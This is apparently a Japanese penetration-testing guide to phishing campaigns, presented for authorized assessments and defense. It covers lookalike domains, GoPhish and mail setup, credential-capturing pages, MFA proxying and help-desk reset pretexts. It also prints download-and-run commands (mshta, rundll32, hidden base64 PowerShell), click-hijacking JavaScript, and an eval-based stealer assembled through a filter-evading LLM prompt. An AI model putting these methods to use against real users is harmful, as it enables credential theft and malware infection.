# Phishing Methodology

## Methodology

1. 被害者をReconする
1. **被害者のドメイン**を選択する。
2. 基本的なWeb enumerationを実施し、被害者が使用している**ログインポータルを検索**して、どれを**偽装する**か**決定**する。
3. **OSINT**を使用して**メールアドレスを見つける**。
2. 環境を準備する
1. phishing assessmentで使用する**ドメインを購入**する。
2. **メールサービス**関連のレコード（SPF、DMARC、DKIM、rDNS）を**設定**する。
3. VPSに**gophish**を設定する。
3. campaignを準備する
1. **メールテンプレート**を準備する。
2. 認証情報を窃取するための**Webページ**を準備する。
4. campaignを開始する！

## 類似したドメイン名を生成する、または信頼されたドメインを購入する

### ドメイン名の変化テクニック

- **Keyword**: ドメイン名に元のドメインの重要な**keyword**を**含める**（例: zelster.com-management.com）。<sup>[[1]](#references)</sup>
- **ハイフン付きサブドメイン**: サブドメインの**ドットをハイフンに変更**する（例: www-zelster.com）。
- **新しいTLD**: **新しいTLD**を使用した同じドメイン（例: zelster.org）
- **Homoglyph**: ドメイン名の文字を**見た目が似ている文字に置き換える**（例: zelfser.com）。


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** ドメイン名内の**2文字を入れ替える**（例: zelsetr.com）。
- **Singularization/Pluralization**: ドメイン名の末尾に「s」を追加または削除する（例: zeltsers.com）。
- **Omission**: ドメイン名から文字を**1つ削除する**（例: zelser.com）。
- **Repetition:** ドメイン名の文字を**1つ繰り返す**（例: zeltsser.com）。
- **Replacement**: Homoglyphと同様だが、ステルス性は低い。ドメイン名の文字を1つ置き換え、元の文字にキーボード上で近い文字などを使用する（例: zektser.com）。
- **Subdomained**: ドメイン名の内部に**ドットを挿入する**（例: ze.lster.com）。
- **Insertion**: ドメイン名に**文字を挿入する**（例: zerltser.com）。
- **ドットの欠落**: TLDをドメイン名に追加する（例: zelstercom.com）

**自動化ツール**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

太陽フレア、宇宙線、ハードウェアエラーなどのさまざまな要因により、保存中または通信中のビットの一部が**自動的に反転する可能性**がある。

この概念を**DNSリクエストに適用すると**、**DNSサーバーが受信するドメイン**が、最初にリクエストされたドメインと同じではない可能性がある。

たとえば、ドメイン「windows.com」の1ビットの変更により、「windnws.com」に変化する可能性がある。

攻撃者は、被害者のドメインに類似した**複数のbit-flippingドメインを登録**して、これを**悪用する可能性**がある。その目的は、正規のユーザーを自分たちのインフラストラクチャにリダイレクトすることである。

詳細については、[https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)を参照。<sup>[[10]](#references)[[11]](#references)</sup>

### 信頼されたドメインを購入する

[https://www.expireddomains.net/](https://www.expireddomains.net)で、使用できそうな期限切れドメインを検索できる。\
購入しようとしている期限切れドメインが**すでに良好なSEOを持っている**ことを確認するには、次のサイトでどのように分類されているかを検索できる。

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## メールアドレスの発見

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester)（100% free）
- [https://phonebook.cz/](https://phonebook.cz)（100% free）
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

有効なメールアドレスを**さらに発見**したり、すでに発見したものを**検証**したりするには、被害者のSMTPサーバーに対してそれらをbrute-forceできるか確認できる。[こちらでメールアドレスの検証・発見方法を学ぶ](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration)。\
さらに、ユーザーがメールにアクセスするために**Webポータルを使用している場合**は、それが**username brute force**に対して脆弱か確認し、可能であればその脆弱性をexploitすることも忘れないこと。

## GoPhishの設定

### インストール

[https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)からダウンロードできる。

`/opt/gophish`内にダウンロードして解凍し、`/opt/gophish/gophish`を実行する。\
出力に、port 3333のadmin user用パスワードが表示される。そのため、そのportにアクセスし、その認証情報を使用してadmin passwordを変更する。portをlocalにtunnelする必要がある場合がある：
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuration

**TLS certificate configuration**

この手順の前に、使用する **domain** を **すでに購入済み** であり、設定対象の **gophish** が動作する VPS の **IP** を **指している** 必要があります。
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**メール設定**

インストールを開始します: `apt-get install postfix`

次のファイルにドメインを追加します:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**/etc/postfix/main.cf** 内の次の変数の値も変更します:

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

最後に、ファイル **`/etc/hostname`** と **`/etc/mailname`** をドメイン名に変更し、**VPSを再起動します。**

次に、`mail.<domain>` の **DNS Aレコード**を作成し、VPSの**IPアドレス**を指定します。また、`mail.<domain>` を指す **DNS MXレコード**を作成します。

それでは、メールの送信をテストします:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophishの設定**

Gophishの実行を停止して、設定しましょう。\
`/opt/gophish/config.json`を以下のように変更します（httpsの使用に注意してください）。
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish serviceを設定する**

gophish serviceを作成して自動的に起動し、serviceとして管理できるようにするには、以下の内容で`/etc/init.d/gophish`ファイルを作成します。
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
次の手順でサービスの設定を完了し、動作を確認します。
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## mail server と domain の設定

### 待機して正当性を高める

domain が古いほど、spam として検出される可能性は低くなります。そのため、phishing assessment の前にできるだけ長く（少なくとも1週間）待つ必要があります。さらに、評判の良い分野に関するページを設置すると、得られる reputation はより良くなります。

1週間待つ必要がある場合でも、設定作業は今すべて完了できます。

### Reverse DNS (rDNS) レコードの設定

VPS の IP アドレスを domain name に解決する rDNS (PTR) レコードを設定します。

### Sender Policy Framework (SPF) レコード

**新しい domain に SPF レコードを設定する必要があります**。SPF レコードが何か分からない場合は、[**このページを読んでください**](../../network-services-pentesting/pentesting-smtp/index.html#spf)。

[https://www.spfwizard.net/](https://www.spfwizard.net) を使用して SPF policy を生成できます（VPS machine の IP を使用してください）。

![phishing domain 用の SPF レコードを生成する SPF Wizard フォーム](<../../images/image (1037).png>)

これは、domain 内の TXT レコードに設定する必要がある内容です：
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### ドメインベースの Message Authentication, Reporting & Conformance (DMARC) レコード

**新しいドメインに DMARC レコードを設定する必要があります**。DMARC レコードについて不明な場合は、[**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc) を読んでください。

ホスト名 `_dmarc.<domain>` を指定し、次の内容を含む新しい DNS TXT レコードを作成する必要があります：
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

**新しいドメイン用に DKIM を設定する必要があります**。DMARC レコードとは何か分からない場合は、[**このページを読んでください**](../../network-services-pentesting/pentesting-smtp/index.html#dkim)。

このチュートリアルは次を基にしています: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)。<sup>[[5]](#references)</sup>

> [!TIP]
> DKIM key が生成する両方の B64 値を連結する必要があります:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### メール設定のスコアをテストする

[https://www.mail-tester.com/](https://www.mail-tester.com) を使用してテストできます\
ページにアクセスし、表示されたアドレスにメールを送信するだけです:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
メールを `check-auth@verifier.port25.com` に送信し、**response を読む**ことでも **email configuration を確認**できます（このためには **port** **25** を **open** し、root としてメールを送信した場合はファイル _/var/mail/root_ で response を確認する必要があります）。\
すべてのテストに合格していることを確認してください：
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
**自分が管理している Gmail にメッセージを送信**し、Gmail の受信トレイで**メールのヘッダー**を確認することもできます。`Authentication-Results` ヘッダーフィールドに `dkim=pass` が含まれているはずです。
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Spamhaus Blacklistからの削除

[www.mail-tester.com](https://www.mail-tester.com) のページで、自分のドメインがSpamhausによってブロックされているか確認できます。以下からドメイン/IPの削除をリクエストできます: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft Blacklistからの削除

​​[https://sender.office.com/](https://sender.office.com) からドメイン/IPの削除をリクエストできます。

## GoPhish Campaignの作成と起動

### Sending Profile

- 送信者プロファイルを識別するための**名前**を設定する
- phishingメールの送信に使用するアカウントを決める。候補: _noreply、support、servicedesk、salesforce..._
- usernameとpasswordは空欄のままでも構いませんが、必ずIgnore Certificate Errorsにチェックを入れてください

![GoPhish Campaignの作成と起動 - Sending Profile: usernameとpasswordは空欄のままでも構いませんが、必ずIgnore Certificate Errorsにチェックを入れてください](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> すべてが正常に動作していることを確認するため、**Send Test Email**機能を使用してテストすることを推奨します。\
> テストによってブラックリストに登録されるのを避けるため、テストメールは**10min mails addresses**に送信することを推奨します。

### Email Template

- templateを識別するための**名前**を設定する
- 次に**subject**を入力する（奇妙なものではなく、通常のメールで読むことが想定される内容にする）
- "**Add Tracking Image**"にチェックが入っていることを確認する
- **email template**を作成する（次の例のように変数を使用できます）:
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
メールの**信頼性を高めるために**、クライアントからのメールに含まれている署名を使用することが推奨されます。提案：

- **存在しないアドレス**にメールを送信し、返信に署名が含まれているか確認する。
- info@ex.com、press@ex.com、public@ex.com のような**公開メールアドレス**を検索し、メールを送信して返信を待つ。
- **発見した有効な**メールアドレスに連絡し、返信を待つ。

![Sending Profile - Email Template: 発見した有効なメールアドレスに連絡し、返信を待つ](<../../images/image (80).png>)

> [!TIP]
> Email Templateでは、**送信するファイルを添付**することもできます。特別に細工したファイルやドキュメントを使用してNTLM challengeも盗みたい場合は、[このページを読んでください](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)。

### Landing Page

- **名前**を入力する
- Webページの**HTML codeを記述**する。Webページを**import**することもできます。
- **Capture Submitted Data**と**Capture Passwords**にチェックを入れる
- **redirectionを設定**する

![Email Template - Landing Page: Capture Submitted DataとCapture Passwordsにチェックを入れる](<../../images/image (826).png>)

> [!TIP]
> 通常は、ページのHTML codeを変更し、ローカル環境（Apache serverなどを使用する場合があります）で、**結果に納得できるまで**テストする必要があります。その後、そのHTML codeをボックスに記述します。\
> HTMLで**static resources**（CSSやJS pagesなど）を使用する必要がある場合は、_**/opt/gophish/static/endpoint**_に保存し、_**/static/\<filename>**_からアクセスできます。

> [!TIP]
> redirectionでは、ユーザーを被害者の**正規のメインWebページ**に**redirect**するか、例えば_/static/migration.html_にredirectし、_**spinning wheel (**[**https://loading.io/**](https://loading.io)**)を5秒間表示してから、処理が成功したことを示す**_ことができます。

### Users & Groups

- 名前を設定する
- **データをImport**する（この例のtemplateを使用するには、各ユーザーのfirstname、last name、email addressが必要です）

![Landing Page - Users & Groups: データをImportする（この例のtemplateを使用するには、各ユーザーのfirstname、last name、email addressが必要です）](<../../images/image (163).png>)

### Campaign

最後に、名前、email template、landing page、URL、sending profile、groupを選択してcampaignを作成します。URLは被害者に送信されるlinkになります。

**Sending Profileでは、最終的なphishing emailがどのように見えるかを確認するためのtest emailを送信できます**。

![Users & Groups - Campaign: Sending Profileでは、最終的なphishing emailがどのように見えるかを確認するためのtest emailを送信できます](<../../images/image (192).png>)

すべての準備ができたら、campaignをlaunchします！

## Website Cloning

何らかの理由でWebサイトをcloneしたい場合は、次のページを確認してください。


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

一部のphishing assessment（主にRed Teams向け）では、**何らかのbackdoorを含むファイル**（C2や、単にauthenticationをtriggerするものなど）も**送信したい**場合があります。\
いくつかの例については、次のページを確認してください：


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

前述のattackは、実際のWebサイトを偽装し、ユーザーが入力した情報を収集するという、非常に巧妙なものです。しかし、ユーザーが正しいpasswordを入力しなかった場合や、偽装したapplicationが2FAで設定されている場合、**この情報だけでは、だまされたユーザーになりすますことはできません**。

ここで、[**evilginx2**](https://github.com/kgretzky/evilginx2)**、** [**CredSniper**](https://github.com/ustayready/CredSniper)、[**muraena**](https://github.com/muraenateam/muraena)などのtoolsが役立ちます。これらのtoolを使用すると、MitMのようなattackを生成できます。基本的に、attackは次のように機能します：

1. 実際のWebページのlogin formに**なりすます**。
2. ユーザーがfake pageに**credentials**を**送信**し、toolがそれらを実際のWebページに送信して、**credentialsが有効か確認する**。
3. accountが**2FA**で設定されている場合、MitM pageが2FAを要求し、**ユーザーが入力**すると、toolがそれを実際のWebページに送信する。
4. ユーザーがauthenticationされると、toolがMitMを実行している間のあらゆる操作から、攻撃者であるあなたは**credentials、2FA、cookie、その他すべての情報をcapture**できる。

### Via VNC

元のWebサイトと同じ外観の**malicious pageに被害者を送る**代わりに、実際のWebページに接続されたbrowserを持つ**VNC sessionに送る**としたらどうでしょうか？被害者の操作を確認し、password、使用されたMFA、cookieなどを盗むことができます。\
これは[**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)で実行できます。<sup>[[3]](#references)[[4]](#references)</sup>

## 検知の検知

当然ながら、侵害が発覚したかどうかを知る最良の方法の1つは、**自分のdomainをblacklist内で検索すること**です。掲載されている場合、何らかの方法で自分のdomainが疑わしいものとして検知されたことになります。\
自分のdomainがblacklistに掲載されているか確認する簡単な方法の1つは、[https://malwareworld.com/](https://malwareworld.com)を使用することです。

ただし、被害者が**実環境で疑わしいphishing activityを積極的に探しているかどうか**を知る方法は他にもあります。次のページで説明されています：


{{#ref}}
detecting-phising.md
{{#endref}}

被害者のdomainと**非常によく似た名前のdomainを購入**したり、あなたが管理するdomainの**subdomain**に被害者のdomainの**keywordを含む**certificateを**生成**したりできます。**被害者**がそれらに対して何らかの**DNSまたはHTTP interaction**を実行すれば、**疑わしいdomainを積極的に探している**ことが分かるため、非常に慎重に行動する必要があります。<sup>[[2]](#references)</sup>

### phishingの評価

[**Phishious** ](https://github.com/Rices/Phishious)を使用して、emailがspam folderに入るのか、blockされるのか、または成功するのかを評価します。

## High-Touch Identity Compromise（Help-Desk MFA Reset）

Modern intrusion setは、email lureを完全に省略し、MFAを回避するために**service-desk / identity-recovery workflowを直接標的にする**ケースが増えています。このattackは完全に"living-off-the-land"です。operatorが有効なcredentialsを取得すると、組み込みのadmin toolingを使用してpivotします。malwareは必要ありません。<sup>[[6]](#references)</sup>

### Attack flow
1. 被害者をReconする
* LinkedIn、data breach、public GitHubなどから個人情報および企業情報を収集する。
* 高価値なidentity（executive、IT、finance）を特定し、password / MFA resetの**正確なhelp-desk process**を列挙する。
2. Real-time social engineering
* 被害者になりすましてhelp-deskに電話、Teams、またはchatで連絡する（多くの場合、**spoofed caller-ID**または**cloned voice**を使用）。
* 事前に収集したPIIを提示し、knowledge-based verificationを通過する。
* agentを説得して**MFA secretをreset**させるか、登録済みmobile numberの**SIM-swap**を実行させる。
3. 即時のpost-access actions（実際のcaseでは≤60 min）
* 任意のweb SSO portalを通じてfootholdを確立する。
* built-insを使用してAD / AzureADを列挙する（binaryはdropしない）：
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* 環境ですでにwhitelistされている**WMI**、**PsExec**、または正規の**RMM** agentを使用してlateral movementを行う。

### Detection & Mitigation
* help-desk identity recoveryを**privileged operation**として扱い、step-up authとmanager approvalを必須にする。
* **Identity Threat Detection & Response (ITDR)** / **UEBA** rulesをdeployし、次の事象をalertする：
* MFA methodの変更 + 新しいdevice / geoからのauthentication。
* 同じprincipalの即時elevation（user-→-admin）。
* help-desk callを記録し、resetの前に**登録済み番号へのcall-back**を必須にする。
* **Just-In-Time (JIT) / Privileged Access**を実装し、新たにresetされたaccountがhigh-privilege tokenを自動的に継承しないようにする。

---

## 大規模なDeception – SEO Poisoning & “ClickFix” Campaigns
Commodity crewは、**search engineとad networkをdelivery channelに変える**mass attackによって、high-touch opsのコストを相殺します。<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising**により、`chromium-update[.]site`のようなfake resultをsearch adの上位に表示させる。
2. 被害者が小さな**first-stage loader**（多くの場合JS/HTA/ISO）をdownloadする。Unit 42が確認した例：
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. loaderがbrowser cookieとcredential DBをexfiltrateし、その後、deployする対象を*realtime*で判断する**silent loader**を取得する：
* RAT（例：AsyncRAT、RustDesk）
* ransomware / wiper
* persistence component（registry Run key + scheduled task）

### Hardening tips
* 新規登録domainをblockし、emailだけでなく**search-ad**にも**Advanced DNS / URL Filtering**を適用する。
* software installationをsigned MSI / Store packageに限定し、policyによって`HTA`、`ISO`、`VBS`のexecutionをdenyする。
* browserのchild processがinstallerを開く動作をmonitorする：
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* first-stage loaderによって頻繁に悪用されるLOLBin（例：`regsvr32`、`curl`、`mshta`）をhuntする。

### TDS handoffを使用したDownload-button click hijacking
一部のfake software portalでは、表示されるdownload `href`を**実際のGitHub/release URL**に設定したまま、JavaScriptによってユーザーの**最初のinteraction**をhijackし、代わりに被害者を**Traffic Distribution System (TDS)** chainへ送ります。<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
主な特徴:
- フックは通常、`document` 上の **capture phase**（`true`）で実行されるため、サイト側のハンドラーより先に発火します。
- Chrome では、リダイレクトを有効な **user gesture** に関連付け、popup blocker の回避を改善するため、`click` ではなく `mousedown` が使われることがよくあります。
- 一部の亜種では、あらかじめ `about:blank` を開くか、`<a target="_blank">` のクリックを合成し、後から TDS URL を割り当てます。
- ブラウザー側の上限値は一般的に `localStorage` に保存されるため、**最初のクリック**では malware に到達し、更新や再試行では一見無害な表示リンクにフォールバックする場合があります。
- TDS は、referrer、entry domain、GEO、ブラウザー／デバイスの fingerprint、VPN／datacenter チェック、クリックコンテキスト、セッションごとのカウンターによって分岐できるため、analyst による replay の結果が非決定的になることがあります。

Defender 向けのアイデア:
- **表示された** `href` と、クリック時に生成される **実際の** navigation target を比較します。
- `window.open`、`about:blank`、または合成された anchor click の周辺で、`preventDefault()` と `stopImmediatePropagation()` の両方を呼び出す `document.addEventListener(..., true)` ハンドラーを探索します。
- 新たに登録された software-download domain の複数の集まりが、同じ CloudFront/JS stage を読み込んでいる場合は、SEO-poisoning/TDS パターンを示す high-signal な兆候として扱います。

### fake verification page + archive-looking LOLBAS fetch による ClickFix
一部の TDS ブランチは、被害者に次のような trusted Windows binary を実行するよう指示する fake verification page（Cloudflare/IUAM style）に到達します:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
- `mshta.exe` は、URL が `.7z` アーカイブを装っている場合でも、レスポンスの先頭にある **HTA/VBScript** を実行します。後続に付加されたアーカイブデータは、純粋なデコイである可能性があります。
- 後続ステージでは、ファイルタイプを偽装し続けることがよくあります（PowerShell に対して `.rtf`、Python に対して `.asar`、パディングされたバイナリを含む ZIP など）。その後、**manual PE mapping / in-memory execution** に切り替えます。
- これらのチェーンのいずれかに対応する場合は、最初の成功実行時点から **network + memory** を保持してください。後続のリプレイでは、無害な installer/SFX パスしか表示されないか、payload/key release が元の TDS セッションにバインドされているため失敗する可能性があります。

### ClickFix DLL delivery tradecraft（偽の CERT update）
* 誘導: **Update** ボタンを備えた、国家 CERT の勧告をクローンしたページを使用し、段階的な「修正」手順を表示します。被害者には、DLL をダウンロードして `rundll32` 経由で実行する batch の実行を指示します。<sup>[[12]](#references)</sup>
* 典型的な batch chain の観測例:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` が payload を `%TEMP%` に配置し、短い sleep で network jitter を隠した後、`rundll32` が export された entrypoint（`notepad`）を呼び出します。
* DLL は host identity を beacon 送信し、数分ごとに C2 を polling します。Remote tasking は **base64-encoded PowerShell** として届き、policy bypass 付きで hidden 実行されます:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* これにより C2 の柔軟性が維持されます（server は DLL を更新せずに task を差し替え可能）。また、console window も隠されます。`-WindowStyle Hidden`、`FromBase64String`、`Invoke-Expression` を同時に使用する `rundll32.exe` の child process としての PowerShell を hunt してください。
* Defender は、`...page.php?tynor=<COMPUTER>sss<USER>` 形式の HTTP(S) callback と、DLL load 後の5分間隔の polling を確認できます。

---

## AI-enhanced phishing operations
攻撃者は現在、**LLM & voice-clone APIs** を連鎖させ、完全に個別化された lure とリアルタイム interaction を実現しています。

| Layer | Threat actor による使用例 |
|-------|-----------------------------|
|Automation|ランダム化した文面と tracking links を使用して、100,000 件を超えるメール / SMS を生成・送信する。|
|Generative AI|公開された M&A 情報や social media 上の内輪ネタを参照した *one-off* メールを作成し、callback scam で CEO の deep-fake voice を使用する。|
|Agentic AI|domain を自律的に登録し、open-source intel を scrape し、被害者が click したものの creds を送信しなかった場合に、次の stage のメールを作成する。|

**Defence:**
• 信頼できない automation から送信されたメッセージを強調表示する **dynamic banners**（ARC/DKIM anomalies 経由）を追加する。  
• 高リスクの電話依頼には **voice-biometric challenge phrases** を導入する。  
• awareness programme で AI-generated lure を継続的に simulate する – static template は obsolete である。

See also – credential phishing における agentic browsing abuse:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – secrets inventory と detection を目的とした、local CLI tools および MCP に対する AI agent abuse:

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript（in-browser codegen）

攻撃者は無害に見える HTML を配布し、**trusted LLM API** に JavaScript を要求して、runtime に stealer を **generate** した後、in-browser で実行できます（例: `eval` または dynamic `<script>`）。<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** exfil URL/Base64 string を prompt に encode し、安全性 filter を bypass して hallucination を減らすために wording を反復する。
2. **Client-side API call:** load 時に、JS が public LLM（Gemini/DeepSeek など）または CDN proxy を呼び出す。static HTML に存在するのは prompt/API call のみ。
3. **Assemble & exec:** response を concatenate して実行する（visit ごとに polymorphic）:
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** 生成されたコードがルアーを個別化し（例：LogoKit の token parsing）、認証情報を prompt-hidden endpoint に POST する。

**回避特性**
- トラフィックは有名な LLM ドメインまたは信頼できる CDN proxy に到達し、backend へ WebSockets 経由で接続する場合もある。
- static payload は存在せず、悪意のある JS は render 後にのみ存在する。
- 非決定的な生成により、session ごとに**固有の stealer**が生成される。

**検知のアイデア**
- JS を有効にした sandbox を実行し、**LLM response を送信元とする runtime `eval` / dynamic script creation**を検知する。
- LLM API への front-end POST の直後に、返された text に対して `eval` / `Function` が実行されていないか調査する。
- client traffic 内の未承認 LLM ドメインと、その後に続く credential POST を検知する。

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
従来の push-bombing に加えて、攻撃者は help-desk への通話中に単純に**新しい MFA registration を強制**し、ユーザーが既に使用している token を無効化する。その後に表示される login prompt は、被害者には正規のものに見える。
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitor for AzureAD/AWS/Okta events where **`deleteMFA` + `addMFA`** occur **within minutes from the same IP**.



## Clipboard Hijacking / Pastejacking

Attackers can silently copy malicious commands into the victim’s clipboard from a compromised or typosquatted web page and then trick the user to paste them inside **Win + R**, **Win + X** or a terminal window, executing arbitrary code without any download or attachment.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### QRを使ったソーシャルエンジニアリングによるWhatsApp device-linking hijack
* 誘導ページ（例：偽の省庁/CERT「channel」）にWhatsApp Web/DesktopのQRを表示し、被害者にスキャンさせることで、攻撃者を**linked device**として密かに追加する。<sup>[[12]](#references)</sup>
* 攻撃者は、セッションが削除されるまで直ちにチャット/連絡先を閲覧できる。被害者には後から「新しいデバイスがリンクされました」という通知が表示される場合がある。defenderは、信頼できないQRページへのアクセス直後に発生した予期しないdevice-linkイベントをhuntできる。

### クローラー/サンドボックスを回避するMobile-gated phishing
